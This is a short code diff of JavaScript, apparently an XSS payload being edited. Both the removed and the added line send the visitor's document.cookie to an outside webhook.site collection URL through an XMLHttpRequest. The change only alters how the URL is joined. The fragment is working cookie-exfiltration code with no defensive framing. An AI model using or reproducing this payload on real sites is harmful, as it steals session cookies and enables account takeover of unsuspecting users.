@@ -8,5 +8,5 @@
       }
     }
   };
-  xhr.open('GET', `https://webhook.site/959a4b59-e0c5-4904-bcc7-6c793ab1fbf8/${document.cookie}`, true);
+  xhr.open('GET', "https://webhook.site/959a4b59-e0c5-4904-bcc7-6c793ab1fbf8" + document.cookie, true);
   xhr.send();
